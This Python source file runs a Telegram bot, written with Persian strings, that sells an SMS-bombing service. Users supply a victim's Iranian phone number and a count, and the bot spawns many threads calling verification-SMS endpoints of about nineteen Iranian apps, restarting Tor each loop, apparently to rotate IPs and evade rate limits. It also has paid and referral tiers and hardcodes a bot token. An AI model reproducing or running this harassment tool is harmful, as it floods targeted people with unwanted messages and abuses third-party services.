#!/usr/bin/python

from telegram.ext import CommandHandler, Updater, ConversationHandler, Filters, MessageHandler, run_async
from telegram import ReplyKeyboardMarkup, ReplyKeyboardRemove
from re import search
from os import system
from requests import get
from time import sleep, time
from threading import Thread
import Api, AdminPanel, json, pymongo
from datetime import datetime
from datetime import date
from pytz import timezone
from random import choice

timezon = timezone('Asia/Tehran')

global Admin_Chatid
Admin_Chatid = 820586182

logChannel_id = -1001427119619
# logChannel_id = -1001358273419

global admin_location
admin_location = ''
global location
location = ''

with open('NoSpamNumbers.txt', 'r') as fo :
    NoSpamNumbers = fo.read().split(',')


token = '1253076808:AAE7fU0XUQlam363zGfgv9xapO_DO9eot00'

#</########Keyboards##################\>
start_keyboard = [['💣اسپم💣'],['💳اطلاعات حساب💳', '🤔راهنما🤔'],['📍زیرمجموعه گیری📍']]
start_markup = ReplyKeyboardMarkup(start_keyboard, resize_keyboard=True)
bombMenu_keyboard = [['بخش ویژه(26 سرور)', 'بخش رایگان'], ['برگشت']]
bombMenu_markup = ReplyKeyboardMarkup(bombMenu_keyboard, resize_keyboard=True)
laghv_keyboard = [["لغو"]]
laghv_markup = ReplyKeyboardMarkup(laghv_keyboard, resize_keyboard=True)
Smenu_keyboard = [['😀بخش رایگان😀', '😍بخش ویژه😍'], ['🤩تست بخش ویژه🤩'], ["برگشت"]]
Smenu_markup = ReplyKeyboardMarkup(Smenu_keyboard, resize_keyboard=True)
ok_keyboard = [['تایید'], ['لغو']]
ok_markup = ReplyKeyboardMarkup(ok_keyboard, resize_keyboard=True)
admin_Skeyboard = [['💣اسپم💣'],['💳اطلاعات حساب💳', '🤔راهنما🤔'], ['📍زیرمجموعه گیری📍'],["ورود به پنل مدیریت"]]
admin_Smarkup = ReplyKeyboardMarkup(admin_Skeyboard, resize_keyboard=True)
admin_Mkeyboard = [['ارسال پیام به همه کاربران', 'ارسال پیام به تک کاربر'],['مشاهده لیست کاربران', 'دانلود دیتابیس'],['بن کردن', 'آزاد کردن'],['ویژه کردن', 'عادی کردن'],['اضافه کردن ضد اسپم','حذف کردن ضد اسپم'],['برگشت']]
admin_Mmarkup = ReplyKeyboardMarkup(admin_Mkeyboard, resize_keyboard=True)
#<\########Keyboards##################/>

# conn = sqlite3.connect('BombDB.db', check_same_thread=False)
# c = conn.cursor()

connect = pymongo.MongoClient("mongodb://localhost:27017")
DB = connect['SMSBomber']
Users = DB['Users']

updater = Updater(token, use_context=True)

##########################DBDefs############################################################################


def InsertTarget(target, id):
    for i in Users.find({'_id':int(id)}): nums=i['Requests']
    nums.append(target)
    Users.find_one_and_update({'_id':int(id)}, {"$set":{'PhoneNumbers':nums}})

##########################DBDefs############################################################################

def SendLog(text):
    get(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={logChannel_id}&text={text}')

@run_async
def start(update, context):
    # global bmm, req
    #</#####AddToDataBase########\>
    global bmm
    try:
        # global bmm, req
        now = datetime.now(timezon)
        timee = now.strftime("%H:%M:%S")
        Users.insert_one({"_id":int(update.message.chat_id), "Username":update.message.from_user.username, "Requests":[], "Subset":0, "VipMode":False, "TestVip":False, "Ban":False, "lastF":{"time":timee, "date":f"{date.today()}"}, "lastLoc":"main_menu"})
        bmm = False
        req = False
    except:
        # global bmm, req
        # print(e)
        now = datetime.now(timezon)
        timee = now.strftime("%H:%M:%S")
        req = True
        for x in Users.find({'_id': int(update.message.chat_id)}): bmm = bool(x['Ban'])
        Users.find_one_and_update({'_id':int(update.message.chat_id)}, {"$set":{'lastF':{"time":timee, "date":f"{date.today()}"}}})
        Users.find_one_and_update({'_id':int(update.message.chat_id)}, {'$set':{'Username':update.message.from_user.username}})

    # <\#####AddToDataBase########/>
    if update.message.chat_id == Admin_Chatid:
        admin_location = 'main_menu'
    # context.bot.send_message(logChannel_id, f'{update.message.chat_id} with @{update.message.from_user.username} started bot!')
    # get(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={logChannel_id}&text={update.message.chat_id} with @{update.message.from_user.username} started bot!')
    Thread(target=SendLog, args=[f'{update.message.chat_id} with @{update.message.from_user.username} started bot!']).start()
    if not bmm:
        if context.args != []:
            subadd = int(context.args[0])
            if not req:
                for i in Users.find({'_id':subadd}): sub=i['Subset']
                sub += 1
                Users.find_one_and_update({"_id":subadd}, {'$set':{'Subset':sub}})
                context.bot.send_message(subadd, text='یک نفر به زیرمجموعه های شما اضافه شد.')
                if sub >= 50:
                    Users.find_one_and_update({"_id": subadd}, {'$set': {'VipMode': True}})
                    context.bot.send_message(subadd, text='حساب کاربری شما با موفقیت ویژه شد.')
        if context.bot.get_chat_member(-1001144465509, update.message.chat_id).status == 'left':
            update.message.reply_text('لطفا در کانال @MrSMSBomber عضو شده و مجدد /start را ارسال کنید.')
        else:
            if update.message.chat_id == Admin_Chatid:
                update.message.reply_text('''سلام به ربات اس ام اس بمبر خوش آمدید😁''', reply_markup=admin_Smarkup)
            else:
                update.message.reply_text('سلام به ربات اس ام اس بمبر خوش آمدید😁', reply_markup=start_markup)
    elif bmm :
        update.message.reply_text('شما از ربات بن شده اید.')

@run_async
def help(update, context):
    for x in Users.find({'_id': int(update.message.chat_id)}): bmm = x['Ban']
    now = datetime.now(timezon)
    timee = now.strftime("%H:%M:%S")
    Users.find_one_and_update({'_id': int(update.message.chat_id)}, {"$set": {'lastF': {"time": timee, "date": f"{date.today()}"}}})
    if not bmm:
        if context.bot.get_chat_member(-1001144465509, update.message.chat_id).status == 'left':
            update.message.reply_text('لطفا در کانال @MrSMSBomber عضو شده و مجدد /start را ارسال کنید.')
        else:
            update.message.reply_text('''
💣اسپم💣 - درخواست زدن برای اسپم اس ام اس

اسپم چیه؟🤔
به ارسال هرزنامه بصورت رگباری و پشت سرهم اسپم میگن😄
—————————————————
💳اطلاعات حساب💳 - نمایش اطلاعات اکانت شما در ربات
—————————————————
📍زیرمجموعه گیری📍 - شما از طریق این بخش میتونید دوستاتون رو به ربات دعوت کنید و حسابتون رو ویژه کنید🤩''')
    elif bmm:
        update.message.reply_text('شما از ربات بن شده اید.')

@run_async
def Spam_Menu(update, context):
    now = datetime.now(timezon)
    timee = now.strftime("%H:%M:%S")
    Users.find_one_and_update({'_id': int(update.message.chat_id)}, {"$set": {'lastF': {"time": timee, "date": f"{date.today()}"}}})
    if update.message.chat_id == Admin_Chatid: global admin_location; admin_location = 'spam_menu'
    else: Users.find_one_and_update({'_id':int(update.message.chat_id)}, {"$set":{"lastLoc":"spam_menu"}})
    update.message.reply_text('یک بخش را انتخواب کنید:', reply_markup=Smenu_markup)

@run_async
def back(update, context):
    now = datetime.now(timezon)
    timee = now.strftime("%H:%M:%S")
    Users.find_one_and_update({'_id': int(update.message.chat_id)}, {"$set": {'lastF': {"time": timee, "date": f"{date.today()}"}}})
    global admin_location
    if update.message.chat_id == Admin_Chatid:
        if admin_location == 'spam_menu':
            update.message.reply_text(
                    'به منوی اصلی برگشتید.',
                    reply_markup=admin_Smarkup)
            admin_location = 'main_menu'
        elif admin_location == 'panel':
            update.message.reply_text('به منوی اصلی برگشتید.', reply_markup=admin_Smarkup)
    else:
        for i in Users.find({'_id':int(update.message.chat_id)}): location=i['lastLoc']
        if location == 'spam_menu':
            update.message.reply_text(
                'به منوی اصلی برگشتید.',
                reply_markup=start_markup)
            Users.find_one_and_update({'_id': int(update.message.chat_id)}, {"$set": {"lastLoc": "main_menu"}})

@run_async
def Admin_Show(update, context):
    if update.message.chat_id == Admin_Chatid:
        global admin_location
        admin_location = 'panel'
        update.message.reply_text('سلام قربان', reply_markup=admin_Mmarkup)
#####################################Free####################################################################

free_GetTarget, free_GetCount = range(2)

CKeyboard = [["لغو"]]
global CMarkup
CMarkup = ReplyKeyboardMarkup(CKeyboard, resize_keyboard=True)
@run_async
def Free_Start(update, context):
    for i in Users.find({'_id':int(update.message.chat_id)}): bmm=i['Ban']
    now = datetime.now(timezon)
    timee = now.strftime("%H:%M:%S")
    Users.find_one_and_update({'_id': int(update.message.chat_id)}, {"$set": {'lastF': {"time": timee, "date": f"{date.today()}"}}})
    if not bmm:
        if context.bot.get_chat_member(-1001144465509, update.message.chat_id).status == 'left':
            update.message.reply_text('لطفا در کانال @MrSMSBomber عضو شده و مجدد /start را ارسال کنید.')
            return ConversationHandler.END
        else:
            for i in Users.find({'_id':int(update.message.chat_id)}): checkReqTime=i['Requests']
            if checkReqTime == []:
                update.message.reply_text("😈لطفا شماره تارگتتون(کسی که میخواید بهش پیامک اسپم کنید) رو بصورت زیر وارد کنید\n+989*********\nمثال: +989120000000", reply_markup=CMarkup)
                return free_GetTarget
            else:
                noww = time()
                fasele = noww - checkReqTime[-1]['systime']
                if fasele <= 300:
                    update.message.reply_text(f'شما تا 5 دقیقه نمیتوانید درخواستی ارسال کنید.\nزمان باقیمانده: {int(300 - fasele)} ثانیه')
                    return ConversationHandler.END
                else:
                    update.message.reply_text(
                        "😈لطفا شماره تارگتتون(کسی که میخواید بهش پیامک اسپم کنید) رو بصورت زیر وارد کنید\n+989*********\nمثال: +989120000000",
                        reply_markup=CMarkup)
                    return free_GetTarget

    elif bmm:
        update.message.reply_text('شما از ربات بن شده اید.')

        return ConversationHandler.END
@run_async
def Free_GetTarget(update, context):
    with open('NoSpamNumbers.txt', 'r') as red:
        NoSpamNumbers = red.read().split(',')
        red.close()
    if search('^\+989\d{9}$', update.message.text) == None :
        update.message.reply_text(
            'لطفا شماره هدفتون رو بصورت زیر ارسال کنید.\n+989120000000\n')
    elif update.message.text in NoSpamNumbers:
        update.message.reply_text('شما نمیتوانید روی این شماره اسپم بزنید.')
        context.bot.send_message(logChannel_id, f'{update.message.chat_id} با آیدی {update.message.from_user.username} در بخش رایگان قصد اسپم زدن به شماره {update.message.text} را داشت')
    else:
        for i in Users.find():
            if str(update.message.text) in str(i['Requests']):
                for x in range(len(i['Requests'])):

                    if str(update.message.text) in str(i['Requests'][x]):
                        syst = i['Requests'][x]['systime']
                        res = time() - syst
                        break
                break
            else:
                res = 300
                break


        if res >= 300:
            global phone
            phone = update.message.text
        # InsertTarget(phone, update.message.chat_id)
            update.message.reply_text("لطفا تعداد پیام هارا وارد کنید.")
            return free_GetCount

        else:
            update.message.reply_text(f'شما تا ۵ دقیقه نمیتوانید روی این شماره اسپم بزنید.\nزمان باقیمانده:{int(res)}')

@run_async
def Free_GetCount(update, context):
    try:
        file = open('MDB.json', 'r')
        CData = json.load(file)
        CData.update({f"{update.message.chat_id}":"0"})
        file.close()
        file = open('MDB.json', 'w')
        cr = json.dumps(CData)
        file.write(cr)
        file.close()
    except:
        file = open('MDB.json', 'w')
        CData = {f"{update.message.chat_id}":"0"}
        Cwrite = json.dumps(CData)
        file.write(Cwrite)
        file.close()
    try:
        if int(update.message.text) <= 0 or int(update.message.text) >= 100 :
            update.message.reply_text('لطفا یک عدد بین 0-100 وارد کنید.')
        else:
            count = int(update.message.text)
            update.message.reply_text('درحال اسپم کردن...', reply_markup=ReplyKeyboardRemove(laghv_keyboard))
            context.bot.send_message(logChannel_id, f'{update.message.chat_id} with @{update.message.from_user.username} request {count} sms in Free to {phone}')
            file = open('MDB.json', 'r')
            js = json.load(file)
            PCount = int(js[f'{update.message.chat_id}'])
            file.close()
            while PCount < count:
                Thread(target=choice([Api.snap, Api.tap30]), args=[phone, update.message.chat_id]).start()
                Thread(target=choice([Api.snap, Api.tap30]), args=[phone, update.message.chat_id]).start()
                # Thread(target=choice([Api.snap, Api.tap30]), args=[phone, update.message.chat_id]).start()
                system("killall -HUP tor")
                file = open('MDB.json', 'r')
                js = json.load(file)
                PCount = int(js[f'{update.message.chat_id}'])
                file.close()
                print('threaded')
                sleep(3)
            # sleep(2)
            # file = open('MDB.json', 'r')
            # js = json.load(file)
            # js[f'{update.message.chat_id}'] = "0"
            # jw = json.dumps(js)
            # file.close()
            # file = open('MDB.json', 'w')
            # file.write(jw)
            # file.close()
            update.message.reply_text(f'{count} اس ام اس به شماره {phone} ارسال شد.\n🚫لطفا تا حداقل 5 دقیقه دیگر درخواست نزنید در غیر اینصورت بن میشید.', reply_markup=Smenu_markup)
            for i in Users.find({'_id':int(update.message.chat_id)}): dataphone=i['Requests']
            now = datetime.now(timezon)
            timee = now.strftime("%H:%M:%S")
            dataphone.append({"target":phone, "time":timee, "systime":time(), "date":f'{date.today()}', "Mode":"Free", "Count":count})
            Users.find_one_and_update({'_id':int(update.message.chat_id)}, {'$set':{'Requests':dataphone}})

            return ConversationHandler.END
    except Exception as e:
        print(e)
        update.message.reply_text('لطفا یک عدد وارد کنید.')
@run_async
def Laghv(update, context):
    now = datetime.now(timezon)
    timee = now.strftime("%H:%M:%S")
    Users.find_one_and_update({'_id': int(update.message.chat_id)}, {"$set": {'lastF': {"time": timee, "date": f"{date.today()}"}}})
    if update.message.chat_id == Admin_Chatid:
        update.message.reply_text(
            'لغو شد.\nبه منوی اصلی برگشتید.',
            reply_markup=admin_Smarkup)
    else:
        update.message.reply_text(
            'لغو شد.\nبه منوی اصلی برگشتید.',
            reply_markup=start_markup)

    return ConversationHandler.END

free_conv = ConversationHandler(
    entry_points=[MessageHandler(Filters.regex('^😀بخش رایگان😀$'), Free_Start)],
    states={
        free_GetTarget : [MessageHandler(Filters.text & ~Filters.regex('^لغو$'), Free_GetTarget)],
        free_GetCount : [MessageHandler(Filters.text & ~Filters.regex('^لغو$'), Free_GetCount)],
    },
    fallbacks=[MessageHandler(Filters.regex('^لغو$'), Laghv)]
)

#####################################Free####################################################################
##########################Vip##########################################################
vip_GetTarget, vip_GetCount = range(2)

@run_async
def VipMood_Start(update, context):
    for i in Users.find({'_id':int(update.message.chat_id)}): bmm=i['Ban']
    now = datetime.now(timezon)
    timee = now.strftime("%H:%M:%S")
    Users.find_one_and_update({'_id': int(update.message.chat_id)}, {"$set": {'lastF': {"time": timee, "date": f"{date.today()}"}}})
    if not bmm:
        if context.bot.get_chat_member(-1001144465509, update.message.chat_id).status == 'left':
            update.message.reply_text('لطفا در کانال @MrSMSBomber عضو شده و مجدد /start را ارسال کنید.')
            return ConversationHandler.END
        else:
            for i in Users.find({'_id':int(update.message.chat_id)}): li=i['VipMode']
            if not li:
                update.message.reply_text('''حساب کاربری شما عادی میباشد.
شما میتوانید برای ویژه کردن حساب خود با آیدی @MrSMSBomber_Admin در ارتباط باشید.
یا از بخش زیرمجموعه گیری اقدام کنید.''')
                return ConversationHandler.END
            else:
                for i in Users.find({'_id': int(update.message.chat_id)}): checkReqTime = i['Requests']
                if checkReqTime == []:
                    update.message.reply_text(
                        "😈لطفا شماره تارگتتون(کسی که میخواید بهش پیامک اسپم کنید) رو بصورت زیر وارد کنید\n+989*********\nمثال: +989120000000",
                        reply_markup=CMarkup)
                    return free_GetTarget
                else:
                    noww = time()
                    fasele = noww - checkReqTime[-1]['systime']
                    if fasele <= 300:
                        update.message.reply_text(
                            f'شما تا 5 دقیقه نمیتوانید درخواستی ارسال کنید.\nزمان باقیمانده: {int(300 - fasele)} ثانیه')
                        return ConversationHandler.END
                    else:
                        update.message.reply_text('سلام به بخش ویژه خوش آمدید😍\n😈لطفا شماره تارگتتون(کسی که میخواید بهش پیامک اسپم کنید) رو بصورت زیر وارد کنید\n+989*********\nمثال: +989120000000',
                                                  reply_markup=CMarkup)
                        return vip_GetTarget

    elif bmm:
        update.message.reply_text('شما از ربات بن شده اید.')
        return ConversationHandler.END

@run_async
def Vip_GetTarget(update, context):
    with open('NoSpamNumbers.txt', 'r') as red:
        NoSpamNumbers = red.read().split(',')
        red.close()
    if search('^\+989\d{9}$', update.message.text) == None:
        update.message.reply_text('لطفا شماره هدفتون رو بصورت زیر ارسال کنید.\n+989120000000\n')
    elif update.message.text in NoSpamNumbers:
        update.message.reply_text('شما نمیتوانید روی این شماره اسپم بزنید.')
        context.bot.send_message(logChannel_id, f'{update.message.chat_id} با آیدی {update.message.from_user.username} در بخش ویژه قصد اسپم زدن به شماره {update.message.text} را داشت')
    else:
        for i in Users.find():
            if str(update.message.text) in str(i['Requests']):
                for x in range(len(i['Requests'])):

                    if str(update.message.text) in str(i['Requests'][x]):
                        syst = i['Requests'][x]['systime']
                        res = time() - syst
                        break
                break
            else:
                res = 300
                break


        if res >= 300:
            global phone
            phone = update.message.text
        # InsertTarget(phone, update.message.chat_id)
            update.message.reply_text("لطفا تعداد پیام هارا وارد کنید.")
            return vip_GetCount

        else:
            update.message.reply_text(f'شما تا ۵ دقیقه نمیتوانید روی این شماره اسپم بزنید.\nزمان باقیمانده:{int(res)}')
        # global phone
        # phone = update.message.text
        # InsertTarget(phone, update.message.chat_id)
        # update.message.reply_text("لطفا تعداد پیام هارا وارد کنید.")

        # return vip_GetCount
@run_async
def Vip_GetCount(update, context):
    try:
        count = int(update.message.text)
        if 0 < count <= 1000:
            try:
                file = open('MDB.json', 'r')
                CData = json.load(file)
                CData.update({f"{update.message.chat_id}": "0"})
                file.close()
                file = open('MDB.json', 'w')
                cr = json.dumps(CData)
                file.write(cr)
                file.close()
            except:
                file = open('MDB.json', 'w')
                CData = {f"{update.message.chat_id}": "0"}
                Cwrite = json.dumps(CData)
                file.write(Cwrite)
                file.close()

            update.message.reply_text('درحال اسپم کردن با 26 سرور...', reply_markup=ReplyKeyboardRemove(laghv_keyboard))
            context.bot.send_message(logChannel_id, f'{update.message.chat_id} with @{update.message.from_user.username} request {count} sms in Vip to {phone}')
            file = open('MDB.json', 'r')
            js = json.load(file)
            PCount = int(js[f'{update.message.chat_id}'])
            file.close()
            while PCount < count:
                Thread(target=choice([Api.snap, Api.tap30, Api.shad, Api.divar, Api.alibaba, Api.arka, Api.bama, Api.Dobltoon, Api.emtiaz, Api.hamrahkart, Api.rubika, Api.sheypoor, Api.smarket, Api.snapfood, Api.sTrip, Api.torob, Api.gap, Api.sDoctor, Api.Tamland]), args=[phone, update.message.chat_id]).start()
                Thread(target=choice([Api.snap, Api.tap30, Api.shad, Api.divar, Api.alibaba, Api.arka, Api.bama, Api.Dobltoon, Api.emtiaz, Api.hamrahkart, Api.rubika, Api.sheypoor, Api.smarket, Api.snapfood, Api.sTrip, Api.torob, Api.gap, Api.sDoctor, Api.Tamland]), args=[phone, update.message.chat_id]).start()
                Thread(target=choice([Api.snap, Api.tap30, Api.shad, Api.divar, Api.alibaba, Api.arka, Api.bama, Api.Dobltoon, Api.emtiaz, Api.hamrahkart, Api.rubika, Api.sheypoor, Api.smarket, Api.snapfood, Api.sTrip, Api.torob, Api.gap, Api.sDoctor, Api.Tamland]), args=[phone, update.message.chat_id]).start()
                Thread(target=choice([Api.snap, Api.tap30, Api.shad, Api.divar, Api.alibaba, Api.arka, Api.bama, Api.Dobltoon, Api.emtiaz, Api.hamrahkart, Api.rubika, Api.sheypoor, Api.smarket, Api.snapfood, Api.sTrip, Api.torob, Api.gap, Api.sDoctor, Api.Tamland]), args=[phone, update.message.chat_id]).start()
                Thread(target=choice([Api.snap, Api.tap30, Api.shad, Api.divar, Api.alibaba, Api.arka, Api.bama, Api.Dobltoon, Api.emtiaz, Api.hamrahkart, Api.rubika, Api.sheypoor, Api.smarket, Api.snapfood, Api.sTrip, Api.torob, Api.gap, Api.sDoctor, Api.Tamland]), args=[phone, update.message.chat_id]).start()
                Thread(target=choice([Api.snap, Api.tap30, Api.shad, Api.divar, Api.alibaba, Api.arka, Api.bama, Api.Dobltoon, Api.emtiaz, Api.hamrahkart, Api.rubika, Api.sheypoor, Api.smarket, Api.snapfood, Api.sTrip, Api.torob, Api.gap, Api.sDoctor, Api.Tamland]), args=[phone, update.message.chat_id]).start()
                Thread(target=choice([Api.snap, Api.tap30, Api.shad, Api.divar, Api.alibaba, Api.arka, Api.bama, Api.Dobltoon, Api.emtiaz, Api.hamrahkart, Api.rubika, Api.sheypoor, Api.smarket, Api.snapfood, Api.sTrip, Api.torob, Api.gap, Api.sDoctor, Api.Tamland]), args=[phone, update.message.chat_id]).start()
                Thread(target=choice([Api.snap, Api.tap30, Api.shad, Api.divar, Api.alibaba, Api.arka, Api.bama, Api.Dobltoon, Api.emtiaz, Api.hamrahkart, Api.rubika, Api.sheypoor, Api.smarket, Api.snapfood, Api.sTrip, Api.torob, Api.gap, Api.sDoctor, Api.Tamland]), args=[phone, update.message.chat_id]).start()
                Thread(target=choice([Api.snap, Api.tap30, Api.shad, Api.divar, Api.alibaba, Api.arka, Api.bama, Api.Dobltoon, Api.emtiaz, Api.hamrahkart, Api.rubika, Api.sheypoor, Api.smarket, Api.snapfood, Api.sTrip, Api.torob, Api.gap, Api.sDoctor, Api.Tamland]), args=[phone, update.message.chat_id]).start()
                Thread(target=choice([Api.snap, Api.tap30, Api.shad, Api.divar, Api.alibaba, Api.arka, Api.bama, Api.Dobltoon, Api.emtiaz, Api.hamrahkart, Api.rubika, Api.sheypoor, Api.smarket, Api.snapfood, Api.sTrip, Api.torob, Api.gap, Api.sDoctor, Api.Tamland]), args=[phone, update.message.chat_id]).start()
                Thread(target=choice([Api.snap, Api.tap30, Api.shad, Api.divar, Api.alibaba, Api.arka, Api.bama, Api.Dobltoon, Api.emtiaz, Api.hamrahkart, Api.rubika, Api.sheypoor, Api.smarket, Api.snapfood, Api.sTrip, Api.torob, Api.gap, Api.sDoctor, Api.Tamland]), args=[phone, update.message.chat_id]).start()
                Thread(target=choice([Api.snap, Api.tap30, Api.shad, Api.divar, Api.alibaba, Api.arka, Api.bama, Api.Dobltoon, Api.emtiaz, Api.hamrahkart, Api.rubika, Api.sheypoor, Api.smarket, Api.snapfood, Api.sTrip, Api.torob, Api.gap, Api.sDoctor, Api.Tamland]), args=[phone, update.message.chat_id]).start()
                file = open('MDB.json', 'r')
                js = json.load(file)
                PCount = int(js[f'{update.message.chat_id}'])
                file.close()
                system("killall -HUP tor")
                print('threaded')
                sleep(3)
            update.message.reply_text(f'{count} اس ام اس به شماره {phone}ارسال شد.\n🚫لطفا تا حداقل 5 دقیقه دیگر درخواست نزنید در غیر اینصورت بن میشید.', reply_markup=Smenu_markup)
            for i in Users.find({'_id':int(update.message.chat_id)}): dataphone=i['Requests']
            now = datetime.now(timezon)
            timee = now.strftime("%H:%M:%S")
            dataphone.append({"target":phone, "time":timee, "systime":time(), "date":f'{date.today()}', "Mode":"Vip", "Count":count})
            Users.find_one_and_update({'_id':int(update.message.chat_id)}, {'$set':{'Requests':dataphone}})
            return ConversationHandler.END
        else:
            update.message.reply_text('محدودیت ارسال پیامک در هر درخواست 1000 تا است.\nلطفا یک عدد بین 0 تا 1000 وارد کنید.')
    except:
        update.message.reply_text('لطفا یک عدد وارد کنید.')

vip_conv = ConversationHandler(
    entry_points=[MessageHandler(Filters.regex('^😍بخش ویژه😍$'), VipMood_Start)],
    states={
        vip_GetTarget : [MessageHandler(Filters.text & ~Filters.regex('^لغو$'), Vip_GetTarget)],
        vip_GetCount : [MessageHandler(Filters.text & ~Filters.regex('^لغو$'), Vip_GetCount)],
    },
    fallbacks=[MessageHandler(Filters.regex('^لغو$'), Laghv)]
)
##########################Vip##########################################################
###############################viptest##############################

vipTest_GetTarget, vipTest_GetCount = range(2)

@run_async
def VipTest_Start(update, context):
    for i in Users.find({'_id':int(update.message.chat_id)}): bmm=i['Ban']
    now = datetime.now(timezon)
    timee = now.strftime("%H:%M:%S")
    Users.find_one_and_update({'_id': int(update.message.chat_id)}, {"$set": {'lastF': {"time": timee, "date": f"{date.today()}"}}})
    if not bmm:
        if context.bot.get_chat_member(-1001144465509, update.message.chat_id).status == 'left':
            update.message.reply_text('لطفا در کانال @MrSMSBomber عضو شده و مجدد /start را ارسال کنید.')
            return ConversationHandler.END
        else:
            for i in Users.find({'_id':int(update.message.chat_id)}): tv=i['TestVip']
            if not tv:
                update.message.reply_text(
                    'شماره هدفتون رو وارد کنید.\n(شما تنها یک بار میتوانید ازین بخش استفاده کنید.)',
                    reply_markup=CMarkup)
                return vipTest_GetTarget
            else:
                update.message.reply_text('شما یک بار این بخش را امتحان کردید.')
                return ConversationHandler.END
    elif bmm:
        update.message.reply_text('شما از ربات بن شده اید.')
        return ConversationHandler.END

@run_async
def VipTest_GetTarget(update, context):
    with open('NoSpamNumbers.txt', 'r') as red:
        NoSpamNumbers = red.read().split(',')
        red.close()
    if search('^\+989\d{9}$', update.message.text) == None:
        update.message.reply_text('لطفا شماره هدفتون رو بصورت زیر ارسال کنید.\n+989120000000\n')
    elif update.message.text in NoSpamNumbers:
        update.message.reply_text('شما نمیتوانید روی این شماره اسپم بزنید.')
        context.bot.send_message(logChannel_id, f'{update.message.chat_id} با آیدی {update.message.from_user.username} در بخش تست ویژه قصد اسپم زدن به شماره {update.message.text} را داشت')
    else:
        for i in Users.find():
            if str(update.message.text) in str(i['Requests']):
                for x in range(len(i['Requests'])):
                    if str(update.message.text) in str(i['Requests'][x]):
                        PReqMode = i['Requests'][x]['Mode']
                        PReqModeID = i['_id']
                        if PReqMode == 'VipTest':
                            Users.find_one_and_update({'_id': int(update.message.chat_id)}, {'$set': {'Ban': True}})
                            Users.find_one_and_update({'_id':int(PReqModeID)}, {'$set':{'Ban':True}})
                            update.message.reply_text('اکانت های شما در ربات به دلیل سو استفاده از بخش تست بن شدند.', reply_markup=ReplyKeyboardRemove(laghv_keyboard))
                            # return ConversationHandler.END
                            del PReqMode, PReqModeID
                            return ConversationHandler.END
                        break
            else:
                retu = True

        if retu:
            global phone
            phone = update.message.text
        # InsertTarget(phone, update.message.chat_id)
            update.message.reply_text("لطفا تعداد پیام هارا وارد کنید.")
            return vipTest_GetCount

@run_async
def VipTest_GetCount(update, context):
    ch = int(update.message.chat_id)
    try:
        count = int(update.message.text)
        if 0 < count <= 1000:
            try:
                file = open('MDB.json', 'r')
                CData = json.load(file)
                CData.update({f"{update.message.chat_id}": "0"})
                file.close()
                file = open('MDB.json', 'w')
                cr = json.dumps(CData)
                file.write(cr)
                file.close()
            except:
                file = open('MDB.json', 'w')
                CData = {f"{update.message.chat_id}": "0"}
                Cwrite = json.dumps(CData)
                file.write(Cwrite)
                file.close()
            file = open('MDB.json', 'r')
            js = json.load(file)
            PCount = int(js[f'{update.message.chat_id}'])
            file.close()
            update.message.reply_text('درحال اسپم کردن با 26 سرور...', reply_markup=ReplyKeyboardRemove(laghv_keyboard))
            for i in Users.find({'_id':int(update.message.chat_id)}): dataphone=i['Requests']
            now = datetime.now(timezon)
            timee = now.strftime("%H:%M:%S")
            dataphone.append({"target":phone, "time":timee, "systime":time(), "date":f'{date.today()}', "Mode":"VipTest", "Count":count})
            Users.find_one_and_update({'_id':int(update.message.chat_id)}, {'$set':{'Requests':dataphone}})
            context.bot.send_message(logChannel_id, f'{update.message.chat_id} with @{update.message.from_user.username} request {count} sms in VipTest to {phone}')
            while PCount < count:
                Thread(target=choice([Api.snap, Api.tap30, Api.shad, Api.divar, Api.alibaba, Api.arka, Api.bama, Api.Dobltoon, Api.emtiaz, Api.hamrahkart, Api.rubika, Api.sheypoor, Api.smarket, Api.snapfood, Api.sTrip, Api.torob, Api.gap, Api.sDoctor, Api.Tamland]), args=[phone, update.message.chat_id]).start()
                Thread(target=choice([Api.snap, Api.tap30, Api.shad, Api.divar, Api.alibaba, Api.arka, Api.bama, Api.Dobltoon, Api.emtiaz, Api.hamrahkart, Api.rubika, Api.sheypoor, Api.smarket, Api.snapfood, Api.sTrip, Api.torob, Api.gap, Api.sDoctor, Api.Tamland]), args=[phone, update.message.chat_id]).start()
                Thread(target=choice([Api.snap, Api.tap30, Api.shad, Api.divar, Api.alibaba, Api.arka, Api.bama, Api.Dobltoon, Api.emtiaz, Api.hamrahkart, Api.rubika, Api.sheypoor, Api.smarket, Api.snapfood, Api.sTrip, Api.torob, Api.gap, Api.sDoctor, Api.Tamland]), args=[phone, update.message.chat_id]).start()
                Thread(target=choice([Api.snap, Api.tap30, Api.shad, Api.divar, Api.alibaba, Api.arka, Api.bama, Api.Dobltoon, Api.emtiaz, Api.hamrahkart, Api.rubika, Api.sheypoor, Api.smarket, Api.snapfood, Api.sTrip, Api.torob, Api.gap, Api.sDoctor, Api.Tamland]), args=[phone, update.message.chat_id]).start()
                Thread(target=choice([Api.snap, Api.tap30, Api.shad, Api.divar, Api.alibaba, Api.arka, Api.bama, Api.Dobltoon, Api.emtiaz, Api.hamrahkart, Api.rubika, Api.sheypoor, Api.smarket, Api.snapfood, Api.sTrip, Api.torob, Api.gap, Api.sDoctor, Api.Tamland]), args=[phone, update.message.chat_id]).start()
                Thread(target=choice([Api.snap, Api.tap30, Api.shad, Api.divar, Api.alibaba, Api.arka, Api.bama, Api.Dobltoon, Api.emtiaz, Api.hamrahkart, Api.rubika, Api.sheypoor, Api.smarket, Api.snapfood, Api.sTrip, Api.torob, Api.gap, Api.sDoctor, Api.Tamland]), args=[phone, update.message.chat_id]).start()
                Thread(target=choice([Api.snap, Api.tap30, Api.shad, Api.divar, Api.alibaba, Api.arka, Api.bama, Api.Dobltoon, Api.emtiaz, Api.hamrahkart, Api.rubika, Api.sheypoor, Api.smarket, Api.snapfood, Api.sTrip, Api.torob, Api.gap, Api.sDoctor, Api.Tamland]), args=[phone, update.message.chat_id]).start()
                Thread(target=choice([Api.snap, Api.tap30, Api.shad, Api.divar, Api.alibaba, Api.arka, Api.bama, Api.Dobltoon, Api.emtiaz, Api.hamrahkart, Api.rubika, Api.sheypoor, Api.smarket, Api.snapfood, Api.sTrip, Api.torob, Api.gap, Api.sDoctor, Api.Tamland]), args=[phone, update.message.chat_id]).start()
                file = open('MDB.json', 'r')
                js = json.load(file)
                PCount = int(js[f'{update.message.chat_id}'])
                file.close()
                system("killall -HUP tor")
                print('threaded')
                sleep(3)
            Users.find_one_and_update({'_id':ch}, {'$set':{'TestVip':True}})
